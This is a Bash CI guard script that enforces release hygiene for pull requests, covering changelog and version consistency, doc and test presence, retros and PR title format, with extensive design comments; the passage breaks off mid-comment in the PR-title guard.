#!/usr/bin/env bash
#
# Shipping guards — the reusable core, extracted from RIA and Claros.
#
# These decide whether a PR can merge. They exist because both repos ship many
# times a day, mostly agent-authored, and the things that rot first under that
# pace are the things nobody is forced to do: the changelog entry, the doc, the
# test, the retro. Every guard here started as a rule written in a CLAUDE.md
# that was then quietly not followed.
#
# WHY A SCRIPT AND NOT INLINE YAML: inline, none of this can be tested without
# pushing a real PR per case, which is slow and is exactly the CI spend we are
# trying to cut. Here it runs against synthetic git history in milliseconds.
# See guards.test.sh.
#
# WHAT BELONGS HERE: judgements about how to ship, which every project gets.
# Facts about one project go in guards.conf. Guards that only make sense for one
# project go in guards.d/*.sh, which is sourced if present — that is how RIA's
# artifact gate and Claros's AI-access guard stay out of this file.
#
# CONTRACT: each subcommand exits 0 (pass) or 1 (fail) and explains itself on
# stdout. Reads BASE_SHA, HEAD_SHA, LABELS (comma-joined PR labels), PR_TITLE
# and PR_AUTHOR from the environment. Run from the repo root.
#
# File-content checks (VERSION, CHANGELOG, retros) read the WORKING TREE, and
# the version guards compare it against MERGE_BASE. So the working tree MUST be
# the PR's own head commit — guards.yml checks out pull_request.head.sha for
# exactly this reason. The default pull_request checkout is the MERGE ref
# (head merged into the CURRENT base), and a PR opened before main bumped MINOR
# would then read main's VERSION on the head side while MERGE_BASE still holds
# the old one: `retro` demands a retro for a bump this PR never made, and
# `retro-debt` counts main's releases. Both sides have to come from one history.
#
# Outside CI BASE_SHA may be left unset: it then defaults to origin/$BASE_BRANCH
# (or $BASE_BRANCH), and HEAD_SHA to HEAD. In CI the event's SHA always wins.
#
# Usage: guards.sh <name>|all      (guards.sh list  — what's available here)
#        guards.sh self-test       (guards.test.sh, then guards.d.test.sh if present)

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ---------------------------------------------------------------------------
# self-test — the guards' own suite, then the project's.
#
# Handled before config and BASE_SHA on purpose: the suites build their own
# throwaway repos and need neither, and the CI job that runs them has no PR
# context to hand over. Two projects each invented a guards.d.test.sh and a CI
# job to run it; this makes that the convention instead of a thing to rediscover.
# Both suites always run, so one red suite cannot hide the other's result.
# ---------------------------------------------------------------------------
if [ "${1:-}" = "self-test" ]; then
  if [ ! -f "$HERE/guards.test.sh" ]; then
    echo "::error::self-test: $HERE/guards.test.sh is missing — reinstall it from the template."
    exit 1
  fi
  rc=0
  echo "--- guards.test.sh (template) ---"
  bash "$HERE/guards.test.sh" || rc=1
  if [ -f "$HERE/guards.d.test.sh" ]; then
    echo "--- guards.d.test.sh (project) ---"
    bash "$HERE/guards.d.test.sh" || rc=1
  else
    echo "(no guards.d.test.sh — no project guard tests to run)"
  fi
  exit $rc
fi

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
GUARDS_CONF="${GUARDS_CONF:-$HERE/guards.conf}"
if [ ! -f "$GUARDS_CONF" ]; then
  echo "::error::No guards.conf at $GUARDS_CONF. Copy guards.conf.example and edit it, or set GUARDS_CONF." >&2
  exit 1
fi

# Available to the config while it is being sourced.
#
# Git reports paths from the repo root with no leading "./", so a root-level
# project whose APP is "." must produce an EMPTY prefix, not "./". Everything
# here is matched with anchored regexes, where "^./CHANGELOG.md$" quietly fails
# to match "CHANGELOG.md" — and "." matching any character means it does not
# even fail loudly. Every path guard in the first version of this template was
# broken exactly that way for root-level repos.
app_prefix() { case "${1:-.}" in .|""|./) echo "" ;; *) echo "${1%/}/" ;; esac; }

# Strip a leading ./ that a hand-written config may still carry, so a config
# written the obvious way keeps working.
_norm() { printf '%s' "${1#./}"; }

# shellcheck source=/dev/null
. "$GUARDS_CONF"

APP_PREFIX="${APP_PREFIX:-$(app_prefix "${APP:-.}")}"

: "${APP:=.}"
: "${VERSION_FIELDS:=3}"
: "${VERSION_FILE:=$APP/VERSION}"
: "${VERSION_MIRRORS:=}"
: "${CHANGELOG:=$APP/CHANGELOG.md}"
: "${CHANGELOG_ARCHIVE_DIR:=$APP/docs/changelog}"
: "${CHANGELOG_ARCHIVE_CMD:=make changelog-archive}"
: "${RETRO_DIR:=$APP/docs/retros}"
: "${RETRO_DEBT_MAX:=8}"
: "${PR_TITLE_TYPES:=feat|fix|docs|refactor|perf|test|chore|build|ci|revert}"
: "${ALLOW_COMMIT_TAGS:=1}"
: "${DOCS_CODE_PATTERN:=}"
: "${DOCS_TARGET_PATTERN:=}"
: "${DOCS_HINT:=}"
: "${TESTS_CODE_PATTERN:=}"
: "${TESTS_TARGET_PATTERN:=}"
: "${CAPABILITY_ADD_PATTERN:=}"
: "${SCOPE_RULES:=}"
: "${SCOPE_SKIP:=}"
: "${BASE_BRANCH:=main}"
: "${RETIRED_RULES:=}"
: "${RETIRED_RULES_DOCS:=(^|/)(CLAUDE|AGENTS|README)\.md$}"
: "${PR_TITLE_CHECK_SUBJECT:=0}"

VERSION_FILE=$(_norm "$VERSION_FILE")
CHANGELOG=$(_norm "$CHANGELOG")
CHANGELOG_ARCHIVE_DIR=$(_norm "$CHANGELOG_ARCHIVE_DIR")
RETRO_DIR=$(_norm "$RETRO_DIR")

# CI passes the event's SHAs and they win. Locally, fall back to the configured
# trunk — four adopting repos use master and three work on develop, and a
# hardcoded origin/main there diffs against nothing or against the wrong line.
if [ -z "${BASE_SHA:-}" ]; then
  BASE_SHA=$(git rev-parse --verify -q "origin/$BASE_BRANCH" || git rev-parse --verify -q "$BASE_BRANCH" || true)
  if [ -z "$BASE_SHA" ]; then
    echo "::error::BASE_SHA is unset and BASE_BRANCH '$BASE_BRANCH' resolves to nothing (tried origin/$BASE_BRANCH and $BASE_BRANCH). Set BASE_BRANCH in guards.conf, or pass BASE_SHA." >&2
    exit 1
  fi
fi
: "${HEAD_SHA:=$(git rev-parse HEAD)}"
LABELS="${LABELS:-}"
PR_AUTHOR="${PR_AUTHOR:-}"

MERGE_BASE="$(git merge-base "$BASE_SHA" "$HEAD_SHA")"
CHANGED="$(git diff --name-only "$MERGE_BASE" "$HEAD_SHA")"

# A version regex with the configured number of fields, so a 3-field project
# cannot accidentally accept a 4-field header and vice versa. Getting this wrong
# is silent: the header parses, the comparison is against the wrong thing.
VER_RE="[0-9]+(\.[0-9]+){$((VERSION_FIELDS - 1))}"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

# NEVER WRITE `… | grep -q` IN THIS FILE. Use `matches` instead.
#
# This script runs under `set -o pipefail`, and `grep -q` exits the instant it
# matches — closing the pipe, killing the producer on the left with SIGPIPE
# (141), and making pipefail report the whole pipeline as FAILED. A guard built
# that way fails precisely when it finds what it is looking for.
#
# It is a race, which is why it ships: if the producer finishes writing before
# grep exits, nothing happens. Small inputs on macOS win that race every time;
# RIA's `wall-dynamic-type` passed locally and failed its own PR on Linux CI.
# Here the exposure was worse — on a diff past the 64 KiB pipe buffer, `scope`
# emitted false and skipped the expensive suite, and `changelog` reported an
# updated changelog as untouched.
#
# `matches` drops -q, so grep reads to EOF and the producer is never signalled.
# The `|| true` absorbs grep's exit 1 on no match. `grep -q FILE` (no pipe) is
# fine — there is no producer to signal. The hazard is only ever the pipe.
matches() { [ -n "$(grep "$@" || true)" ]; }

# Exact match against the comma-joined label list, so 'docs-exempt' can never be
# satisfied by a label that merely CONTAINS it as a substring.
has_label() { printf ',%s,' "$LABELS" | matches -F ",$1,"; }

# Commit-message escape hatch, e.g. [skip docs].
#
# The tag must be in a commit SUBJECT, or alone on its own line in a body. A
# plain substring search over the whole message was the first version and it was
# wrong in the most embarrassing way available: the commit that INTRODUCED these
# guards explained the tags in its body and thereby bypassed three of its own
# guards. Prose discussing a tag is always inline mid-sentence; a deliberate
# opt-out is a subject suffix or a line of its own. That separates them, and
# keeps a doc that merely NAMES an escape hatch from silently using it.
has_tag() {
  [ "$ALLOW_COMMIT_TAGS" = "1" ] || return 1
  local tag="$1" esc
  if git log "${MERGE_BASE}..${HEAD_SHA}" --format=%s | matches -iF "$tag"; then
    return 0
  fi
  esc=$(printf '%s' "$tag" | sed 's/[][\.*^$\/]/\\&/g')
  git log "${MERGE_BASE}..${HEAD_SHA}" --format=%b \
    | matches -iE "^[[:space:]]*${esc}[[:space:]]*$"
}

# `exempt <label> <tag>` — true if either form opted out. Prints WHICH one, so a
# passing guard always says why it passed. A guard that prints only "✓" when it
# was skipped is how an exemption becomes permanent without anyone deciding to.
exempt() {
  if has_label "$1"; then echo "✓ '$1' label present — skipping."; return 0; fi
  if has_tag "$2"; then echo "✓ '$2' found in a commit message — skipping."; return 0; fi
  return 1
}

# A dependabot PR that only bumps GitHub Actions — every changed path under
# .github/ (workflow pins, dependabot.yml). Such a PR has no VERSION bump, no
# changelog entry and a title like "ci(deps): bump actions/checkout", so the
# ship-a-release guards could never pass it, and the only way to merge the
# security fixes dependabot exists for was a label on every one of them.
#
# STRUCTURAL, not a bot bypass: it keys on WHAT changed as well as who. A
# dependabot PR touching package.json or requirements.txt changes what ships
# and still runs every guard. The author is the event's login, and no human
# account can be named `dependabot[bot]`.
dependabot_actions_only() {
  [ "$PR_AUTHOR" = "dependabot[bot]" ] || return 1
  [ -n "$CHANGED" ] || return 1
  if printf '%s\n' "$CHANGED" | matches -v '^\.github/'; then return 1; fi
  echo "✓ dependabot actions bump — skipped (every changed path is under .github/)."
}

# Emit a step output under Actions; print it otherwise, so the test suite and a
# human running this locally both see the value.
emit() {
  if [ -n "${GITHUB_OUTPUT:-}" ]; then echo "$1=$2" >> "$GITHUB_OUTPUT"; fi
  echo "output: $1=$2"
}

# Version reads. The BASE side comes from git (the merge-base commit); the HEAD
# side comes from the WORKING TREE, which CI has checked out at HEAD.
#
# Reading the head side from `git show "$HEAD_SHA:..."` would be equivalent under
# CI and silently wrong when a human runs the guards with uncommitted changes:
# a working-tree VERSION compared against a committed MINOR reports a real MINOR
# bump as a PATCH. One source per side, consistently.
_head_version() { tr -d '[:space:]' < "$VERSION_FILE"; }
# `|| true` is load-bearing: under `set -o pipefail` a missing file at the base
# commit makes git exit non-zero, which takes the pipeline down with it and kills
# the whole script inside a command substitution — silently, with no output. An
# absent base version is a normal state (the PR that adds the file), not an
# error, so it must read as empty rather than as a crash.
_base_version() { { git show "$MERGE_BASE:$VERSION_FILE" 2>/dev/null || true; } | tr -d '[:space:]'; }
_ver_field() { printf '%s' "$1" | cut -d. -f"$2"; }
_head_major() { _ver_field "$(_head_version)" 1; }
_head_minor() { _ver_field "$(_head_version)" 2; }
_base_major() { _ver_field "$(_base_version)" 1; }
_base_minor() { _ver_field "$(_base_version)" 2; }

# ---------------------------------------------------------------------------
# Guards
# ---------------------------------------------------------------------------

# Which expensive jobs does this diff justify? Pure output, never fails.
#
# Two forms, because they fail in opposite directions:
#
#   SCOPE_RULES  "<name>:<regex>" — an ALLOW-list: <name>=true when some path
#                matches. Right for a job that owns one corner of the repo.
#   SCOPE_SKIP   <regex> — a DENY-list, emitted as `code`: true unless EVERY
#                changed path matches it. Gate the main test suite on this one.
#
# Run-by-default is the safe direction to be wrong in. With an allow-list, a new
# top-level directory nobody remembered to add silently skips the tests for
# everything in it, and the first sign is a regression on main. With a deny-list
# the same oversight costs one unneeded test run. RIA's scope has worked this
# way since the root flatten; the template only had the allow-list form.
cmd_scope() {
  echo "Changed files:"; echo "$CHANGED"
  local line name pat unskipped
  if [ -n "$SCOPE_RULES" ]; then
    while IFS= read -r line; do
      [ -n "$line" ] || continue
      name="${line%%:*}"; pat="${line#*:}"
      if echo "$CHANGED" | matches -E "$pat"; then
        emit "$name" true
      else
        emit "$name" false
      fi
    done <<< "$SCOPE_RULES"
  else
    echo "(no SCOPE_RULES configured)"
  fi
  if [ -z "$SCOPE_SKIP" ]; then
    emit code true
    echo "→ no SCOPE_SKIP configured: the suite always runs."
    return 0
  fi
  unskipped=$(echo "$CHANGED" | grep -vE "$SCOPE_SKIP" || true)
  if [ -n "$unskipped" ]; then
    emit code true
    echo "→ paths outside SCOPE_SKIP changed: the suite WILL run. First few:"
    # sed, not head: head exits after five lines and SIGPIPEs the printf.
    printf '%s\n' "$unskipped" | sed -n '1,5p'
  else
    emit code false
    echo "→ every changed path matches SCOPE_SKIP: skipping the suite."
  fi
}

# A change to capability code must ship a doc update in the SAME change.
#
# Not because docs are virtuous, but because an investigation whose findings
# live only in a chat log gets re-run from scratch in three weeks — by the next
# agent, at full cost, reaching the same conclusion.
cmd_docs() {
  [ -n "$DOCS_CODE_PATTERN" ] || { echo "✓ docs guard not configured."; return 0; }
  if dependabot_actions_only; then return 0; fi
  if exempt docs-exempt '[skip docs]'; then return 0; fi
  local code docs
  code=$(echo "$CHANGED" | grep -E "$DOCS_CODE_PATTERN" || true)
  docs=$(echo "$CHANGED" | grep -E "$DOCS_TARGET_PATTERN" || true)
  if [ -n "$code" ] && [ -z "$docs" ]; then
    echo "::error::Code changed but no docs were updated."
    [ -n "$DOCS_HINT" ] && echo "$DOCS_HINT"
    echo "Or apply the 'docs-exempt' label${ALLOW_COMMIT_TAGS:+ / add [skip docs] to a commit message}."
    echo "Offending code files:"; echo "$code"
    return 1
  fi
  echo "✓ docs presence guard passed."
}

# Any change to code must add or update a test, so fast iteration cannot quietly
# regress coverage.
cmd_tests() {
  [ -n "$TESTS_CODE_PATTERN" ] || { echo "✓ tests guard not configured."; return 0; }
  if dependabot_actions_only; then return 0; fi
  if exempt tests-exempt '[skip tests]'; then return 0; fi
  local code tests
  code=$(echo "$CHANGED" | grep -E "$TESTS_CODE_PATTERN" || true)
  tests=$(echo "$CHANGED" | grep -E "$TESTS_TARGET_PATTERN" || true)
  if [ -n "$code" ] && [ -z "$tests" ]; then
    echo "::error::Code changed but no test was added or updated."
    echo "Add or update a test alongside the change, or apply 'tests-exempt' if it genuinely needs none."
    echo "Offending code files:"; echo "$code"
    return 1
  fi
  echo "✓ tests presence guard passed."
}

# Every PR records what changed, so history stays a complete log however fast the
# project ships — and when an agent is shipping, "I'll write it up later" has no
# author to fall back on.
cmd_changelog() {
  if dependabot_actions_only; then return 0; fi
  if exempt changelog-exempt '[skip changelog]'; then return 0; fi
  if echo "$CHANGED" | matches -E "^$CHANGELOG$"; then
    echo "✓ $CHANGELOG updated."
  else
    echo "::error::This PR does not update $CHANGELOG. Add a '## X.Y.Z — date' entry (and bump $VERSION_FILE), or apply 'changelog-exempt' for a pure infra/no-op change."
    return 1
  fi

  # Presence is not enough: an entry can ship while VERSION stays stale. Both
  # repos have caught exactly that. Assert the invariant directly.
  local top ver base_top
  top=$(grep -m1 -oE "^## $VER_RE" "$CHANGELOG" | awk '{print $2}' || true)
  ver=$(tr -d '[:space:]' < "$VERSION_FILE")
  if [ -z "$top" ]; then
    echo "::error::$CHANGELOG has no parseable top version header (expected '## ${VERSION_FIELDS}-field version — date')."
    return 1
  fi
  if [ "$top" != "$ver" ]; then
    echo "::error::$VERSION_FILE ($ver) does not match the top $CHANGELOG header ($top). Bump VERSION together with the changelog entry."
    return 1
  fi
  echo "✓ VERSION ($ver) matches top CHANGELOG header."

  # The top header must be NEW relative to base. Appending to an already-released
  # entry is the failure this catches: a PR adding two pages, an API change and a
  # single bullet under a shipped version, with every guard green in six seconds.
  # That happened. An unbumped PR now either edits no changelog (failing the
  # presence check above) or carries changelog-exempt and ships nothing.
  base_top=$(git show "$MERGE_BASE:$CHANGELOG" 2>/dev/null | grep -m1 -oE "^## $VER_RE" | awk '{print $2}' || true)
  if [ -n "$base_top" ]; then
    if [ "$top" = "$base_top" ]; then
      echo "::error::The top $CHANGELOG entry ($top) already exists on the base branch. Open a NEW '## X.Y.Z' entry and bump $VERSION_FILE — a released entry is closed."
      return 1
    fi
    if [ "$(printf '%s\n%s\n' "$base_top" "$top" | sort -V | tail -1)" != "$top" ]; then
      echo "::error::New CHANGELOG version ($top) is not greater than the previous one ($base_top)."
      return 1
    fi
    echo "✓ Version bump is monotonic ($base_top → $top)."
  fi
}

# CHANGELOG.md holds the current MINOR series only; older series move to
# CHANGELOG_ARCHIVE_DIR. Per-minor rather than a line budget, because a line
# budget splits mid-series and "where is 2.0.4?" stops having one answer.
#
# This matters more than it looks when agents read the repo: the changelog is
# injected context, so its length is a per-turn cost on every session.
cmd_changelog_archive() {
  local series count
  if [ ! -f "$CHANGELOG" ]; then
    echo "::error::$CHANGELOG not found."; return 1
  fi
  series=$(grep -oE '^## [0-9]+\.[0-9]+' "$CHANGELOG" | awk '{print $2}' | sort -u -V)
  count=$(printf '%s\n' "$series" | grep -c '[0-9]' || true)
  if [ "$count" -le 1 ]; then
    echo "✓ $CHANGELOG holds a single minor series."; return 0
  fi
  echo "::error::$CHANGELOG holds $count minor series ($(printf '%s' "$series" | tr '\n' ' ')). Run '$CHANGELOG_ARCHIVE_CMD' to move the older ones into $CHANGELOG_ARCHIVE_DIR/."
  return 1
}

# The top-level "version" of a JSON document, or nothing. A tiny brace-depth
# scanner rather than a regex: package.json routinely carries dependency pins
# and engine ranges BEFORE its own version, and "the first version-shaped string
# in the file" read one of those. Claros anchored to a two-space indent, which
# is right for its file and wrong for a minified or tab-indented one; depth is
# right for all three. POSIX awk, because the template assumes no jq/python.
_json_top_version() {
  awk '
    { s = s $0 "\n" }
    END {
      n = length(s); d = 0; i = 1
      while (i <= n) {
        c = substr(s, i, 1)
        if (c == "{" || c == "[") d++
        else if (c == "}" || c == "]") d--
        else if (c == "\"") {
          j = i + 1; str = ""
          while (j <= n) {
            ch = substr(s, j, 1)
            if (ch == "\\") { str = str ch substr(s, j + 1, 1); j += 2; continue }
            if (ch == "\"") break
            str = str ch; j++
          }
          i = j
          if (d == 1 && str == "version") {
            k = i + 1
            while (substr(s, k, 1) ~ /[ \t\n\r]/) k++
            if (substr(s, k, 1) != ":") { i++; continue }
            k++
            while (substr(s, k, 1) ~ /[ \t\n\r]/) k++
            if (substr(s, k, 1) == "\"") {
              v = ""; k++
              while (k <= n && substr(s, k, 1) != "\"") { v = v substr(s, k, 1); k++ }
              print v; exit
            }
          }
        }
        i++
      }
    }' "$1"
}

# The canonical version file and any file that mirrors it must agree. No exempt
# label: they either agree or one of them is a lie.
#
# A .json mirror is read by its top-level "version" key only (see above). Any
# other mirror (a plist, a gradle file) still takes the first version-shaped
# string, which is what those formats put first in practice.
cmd_version_sync() {
  [ -n "$VERSION_MIRRORS" ] || { echo "✓ no version mirrors configured."; return 0; }
  local ver rc=0 f found
  ver=$(_head_version)
  for f in $VERSION_MIRRORS; do
    if [ ! -f "$f" ]; then
      echo "::error::VERSION_MIRRORS names $f, which does not exist."; rc=1; continue
    fi
    case "$f" in
      *.json)
        found=$(_json_top_version "$f")
        if [ -z "$found" ]; then
          echo "::error::$f has no top-level \"version\" key. Add one set to $ver, or drop it from VERSION_MIRRORS."
          rc=1; continue
        fi ;;
      # sed -n, not head: head exits early and SIGPIPEs grep on a large file.
      *) found=$(grep -oE "$VER_RE" "$f" | sed -n '1p' || true) ;;
    esac
    if [ "$found" != "$ver" ]; then
      echo "::error::$f says '$found' but $VERSION_FILE says '$ver'. They must agree."
      rc=1
    fi
  done
  [ "$rc" -eq 0 ] && echo "✓ every version mirror matches $VERSION_FILE ($ver)."
  return $rc
}

# The bump LEVEL is a semantic call — "is this new capability, and does it break
# anything?" — so this guard deliberately does not make it. It challenges a
# level that looks wrong against structural evidence, and makes a MAJOR justify
# itself in writing.
cmd_bump_level() {
  local base_ver head_ver base_major head_major base_minor head_minor signals
  if dependabot_actions_only; then return 0; fi
  base_ver=$(_base_version); head_ver=$(_head_version)
  if [ -z "$head_ver" ]; then
    echo "::error::Could not read $VERSION_FILE at HEAD."; return 1
  fi
  # No version on the base side means this PR is ADDING it — the first release,
  # or the PR that adopts these guards. There is nothing to compare a bump
  # against, and failing here would mean the template's own adoption PR could
  # never go green, which is a good way to have the guards deleted on day one.
  if [ -z "$base_ver" ]; then
    echo "✓ $VERSION_FILE is new in this PR ($head_ver) — nothing to compare."
    return 0
  fi
  echo "VERSION: $base_ver → $head_ver"
  if [ "$base_ver" = "$head_ver" ]; then
    echo "✓ No version change (the changelog guard covers whether one was required)."
    return 0
  fi

  base_major=$(_base_major); head_major=$(_head_major)
  base_minor=$(_base_minor); head_minor=$(_head_minor)

  # A MAJOR must say what breaks, in the entry itself — the counterpart to the
  # retro requirement on MINOR. Enforcement that the call was considered, not a
  # human approval gate.
  if [ "$head_major" -gt "$base_major" ]; then
    if awk '/^## /{n++} n==1' "$CHANGELOG" | matches -iE '^### (Breaking|Removed)'; then
      echo "✓ MAJOR bump ($base_major → $head_major) documents what breaks."
      return 0
    fi
    echo "::error::This PR bumps MAJOR ($base_major → $head_major). The top $CHANGELOG entry must carry a '### Breaking' (or '### Removed') section saying what breaks."
    return 1
  fi

  if [ "$head_minor" -gt "$base_minor" ]; then
    echo "✓ MINOR bump — the retro guard covers this one."
    return 0
  fi

  [ -n "$CAPABILITY_ADD_PATTERN" ] || { echo "✓ PATCH bump (no capability signals configured)."; return 0; }
  if has_label patch-intentional; then
    echo "✓ 'patch-intentional' label present — skipping the milestone challenge."
    return 0
  fi
  signals=$(git diff --name-status "$MERGE_BASE" "$HEAD_SHA" | awk '$1=="A" {print $2}' \
    | grep -E "$CAPABILITY_ADD_PATTERN" || true)
  if [ -n "$signals" ]; then
    echo "::error::This PR bumps only PATCH ($base_ver → $head_ver) but adds capability-shaped surfaces. Bump MINOR (and add a retro), or apply 'patch-intentional' if these genuinely aren't new user-visible capability."
    echo "Added:"; echo "$signals"
    return 1
  fi
  echo "✓ PATCH bump with no new capability surface."
}

# A milestone is a MINOR (or MAJOR) bump. It must ship a retro. PATCH is untaxed.
cmd_retro() {
  if dependabot_actions_only; then return 0; fi
  if exempt retro-exempt '[skip retro]'; then return 0; fi
  local base_minor head_minor base_major head_major retro level
  base_minor=$(_base_minor); head_minor=$(_head_minor)
  base_major=$(_base_major); head_major=$(_head_major)
  echo "VERSION fields: base=$base_major.$base_minor head=$head_major.$head_minor"
  if [ -z "$head_minor" ] || [ -z "$head_major" ]; then
    echo "::error::Could not read MAJOR/MINOR from $VERSION_FILE at HEAD."; return 1
  fi
  # Same as bump-level: no base version means this PR introduces the file, so
  # there is no bump to call a milestone.
  if [ -z "$base_major" ] || [ -z "$base_minor" ]; then
    echo "✓ $VERSION_FILE is new in this PR — not a milestone bump."
    return 0
  fi

  # MAJOR first: a MAJOR bump resets MINOR to 0, so comparing MINOR alone reads
  # 5 → 0 as "went backwards, not a milestone" and lets the biggest milestone
  # there is ship with no retro.
  if [ "$head_major" -gt "$base_major" ]; then
    level=MAJOR
  elif [ "$head_minor" -gt "$base_minor" ]; then
    level=MINOR
  else
    echo "✓ Not a milestone (no MAJOR or MINOR increase) — no retro required."
    return 0
  fi

  retro=$(echo "$CHANGED" | grep -E "^$RETRO_DIR/.*\.md$" | grep -v -iE '/(README|TEMPLATE)\.md$' || true)
  if [ -z "$retro" ]; then
    echo "::error::This is a $level bump — a milestone — and must ship a retro under $RETRO_DIR/."
    echo "Or apply 'retro-exempt' if it genuinely isn't a milestone."
    return 1
  fi
  echo "✓ $level bump ships a retro:"; echo "$retro"
}

# Patch releases accumulate. Past the cap the next release must be a milestone,
# so a line cannot run forever without anyone asking what it added up to.
cmd_retro_debt() {
  local majmin count
  majmin=$(_head_version | cut -d. -f1,2)
  count=$(grep -cE "^## ${majmin//./\\.}\." "$CHANGELOG" || true)
  echo "Releases in the $majmin line (head): $count (cap $RETRO_DEBT_MAX)"
  if [ "$count" -gt "$RETRO_DEBT_MAX" ]; then
    if exempt retro-exempt '[skip retro]'; then return 0; fi
    echo "::error::Retro debt: the $majmin line already has $count releases. The next release must bump MINOR and ship a retro — or carry 'retro-exempt' if a milestone genuinely isn't due."
    return 1
  fi
  echo "✓ Under the retro-debt cap — a milestone is not yet forced."
}

# A retro whose follow-ups are never actioned is an apology with a table in it.
#
# The `retro` guard forces you to WRITE one. This makes its output binding: every
# row in a '## Gaps found' table must end up landed, or blocked with a NAMED
# reason. A bare "deferred" fails.
#
# The rule is deliberately NOT "no debt". "Fix everything before shipping
# anything" cannot be satisfied — some gaps wait on a setting someone has to
# click, or hardware that has to exist. A gate nobody can pass gets bypassed, and
# a bypassed gate means nothing. So: no UNNAMED debt. `blocked:` is the pressure
# valve, and it is honest.
#
# `tracked: #N` WAS accepted, with a cap on open issues, and 2.0.0 removed it.
# It read as responsible and worked as an escape hatch: in RIA nine gaps sat open
# for weeks while every retro passed by naming an issue, and one gap was filed
# six separate times. Filing an issue is the feeling of doing the work with a
# number attached. If a gap can be fixed, the milestone that found it fixes it.
#
# Status is read after stripping markdown emphasis (** _ `), so '**landed**'
# counts — and it must START with "landed", so 'not landed yet' does not.
#
# WHICH cell is the status comes from the table's HEADER row: the first column
# whose heading matches status / resolution / state (any case), else the last
# column. Reading "the last cell" blind broke three ways: a table with a Notes
# column after Status, a row written without the trailing '|' (valid markdown,
# and then the last cell was the Follow-up text), and a reason containing a
# pipe. A literal '|' inside a cell must be escaped as '\|', as markdown itself
# requires — an unescaped one is a new column to every renderer. When the
# status is the last column, surplus cells are joined back into it, so
# 'blocked: a | b' still reads as one reason rather than as the status 'b'.
#
# _gap_statuses <file> — one status per data row of the '## Gaps found' tables.
_gap_statuses() {
  awk '
    function trim(x) { sub(/^[ \t]+/, "", x); sub(/[ \t]+$/, "", x); return x }
    # Split a row into cells[1..n]; returns n. An escaped \| stays in its cell.
    function cellsplit(l,   n, i) {
      gsub(/\\\|/, "\034", l)
      l = trim(l); sub(/^\|/, "", l)
      if (l ~ /\|$/) l = substr(l, 1, length(l) - 1)
      n = split(l, cells, "|")
      for (i = 1; i <= n; i++) { gsub(/\034/, "|", cells[i]); cells[i] = trim(cells[i]) }
      return n
    }
    function is_sep(n,   i) {
      for (i = 1; i <= n; i++) if (cells[i] !~ /^:?-+:?$/) return 0
      return 1
    }
    /^## Gaps found/ { f = 1; hdr = 0; next }
    /^## /           { f = 0; next }
    !f { next }
    !/^[ \t]*\|/ { hdr = 0; next }          # anything else ends the table
    {
      n = cellsplit($0)
      if (!hdr) {                           # the header row of a new table
        hdr = 1; ncol = n; col = 0
        for (i = 1; i <= n; i++) {
          h = tolower(cells[i]); gsub(/[*_`]/, "", h)
          if (!col && h ~ /status|resolution|state/) col = i
        }
        if (!col) col = n
        next
      }
      if (is_sep(n)) next
      st = cells[col]
      if (col == ncol) for (i = col + 1; i <= n; i++) st = st " | " cells[i]
      print st
    }' "$1"
}

cmd_followups() {
  if exempt followups-exempt '[skip followups]'; then return 0; fi
  [ -d "$RETRO_DIR" ] || { echo "✓ no retros yet — nothing to enforce."; return 0; }

  local bad=0 file status plain lower
  for file in "$RETRO_DIR"/*.md; do
    [ -f "$file" ] || continue
    case "$(basename "$file")" in README.md|TEMPLATE.md) continue ;; esac
    while IFS= read -r status; do
      plain=$(printf '%s' "$status" | sed 's/[*_`]//g; s/^ *//')
      lower=$(printf '%s' "$plain" | tr '[:upper:]' '[:lower:]')
      if [[ "$lower" =~ ^landed ]]; then
        continue
      elif [[ "$lower" =~ ^blocked:[[:space:]]*[^[:space:]] ]]; then
        continue
      fi
      echo "::error::$(basename "$file"): follow-up has no owner — '$status'"
      echo "    Must be 'landed …' or 'blocked: <reason>'. ('tracked: #N' is no longer an owner.)"
      bad=1
    done < <(_gap_statuses "$file")
  done

  if [ "$bad" -ne 0 ]; then
    echo
    echo "  A bare 'deferred' is the thing being prevented. Fix it here, or write"
    echo "  'blocked: <what stops you>' — a promise with nothing behind it is"
    echo "  indistinguishable from forgetting, and an issue number is not an owner."
    return 1
  fi
  echo "✓ every follow-up is landed or blocked with a named reason."
}

# The PR title is what a squash merge writes into main's history.
#
# Under GitHub's DEFAULT squash title (COMMIT_OR_PR_TITLE) a SINGLE-commit PR is
# squashed with the COMMIT SUBJECT, not the title; with PR_TITLE_CHECK_SUBJECT=1
# both are checked. A PR that landed titled correctly and committed carelessly
# still put the wrong line in the log — and it is still there. The standard
# settings (squash_merge_commit_title=PR_TITLE) close that hole on GitHub's side,
# so the subject check is off by default.
# What GitHub will actually put on main, when nothing handed us a PR title.
#
# CI sets PR_TITLE; `make guards` does not, so this guard printed "skipping"
# and exited 0 on every local run — the one guard covering PR metadata was
# invisible to the command that exists precisely so you do not have to push to
# find out. Three PRs went out with the version on the wrong end of the title
# before CI (down for billing at the time) could say so.
#
# Two sources, in the order they become true:
#   - an open PR's title, once there is a PR
#   - a single-commit branch's SUBJECT, which is what --squash takes, and which
#     is checkable before the PR exists at all
# A multi-commit branch with no PR yet has nothing to check and still skips —
# but it says so in those words, rather than implying the guard ran.
_resolve_pr_title() {
  local resolved=""
  if command -v gh >/dev/null 2>&1; then
    resolved=$(gh pr view --json title -q .title 2>/dev/null || true)
  fi
  if [ -z "$resolved" ] \
     && [ "$(git rev-list --count "${MERGE_BASE}..${HEAD_SHA}" 2>/dev/null || echo 0)" = "1" ]; then
    resolved=$(git log -1 --format=%s "$HEAD_SHA")
  fi
  printf '%s' "$resolved"
}

cmd_pr_title() {
  local title="" ver="" subject="" n=""
  if dependabot_actions_only; then return 0; fi
  title="${PR_TITLE:-}"
  [ -n "$title" ] || title=$(_resolve_pr_title)
  [ -n "$title" ] || {
    echo "✓ nothing to check yet — no PR, and more than one commit on the branch."
    return 0
  }
  ver=$(_head_version)
  if ! printf '%s' "$title" | matches -E "^v${ver//./\\.} ($PR_TITLE_TYPES)(\(.+\))?: .+"; then
    echo "::error::PR title must be 'v$ver <type>: <summary>' (types: $PR_TITLE_TYPES)."
    echo "  got: $title"
    return 1
  fi
  # Off by default (PR_TITLE_CHECK_SUBJECT=0). GitHub squashes a single-commit
  # PR with its COMMIT SUBJECT only while squash_merge_commit_title is
  # COMMIT_OR_PR_TITLE, its default. The standard (ria-new-project --settings)
  # sets it to PR_TITLE, so the title checked above is what lands on main and a
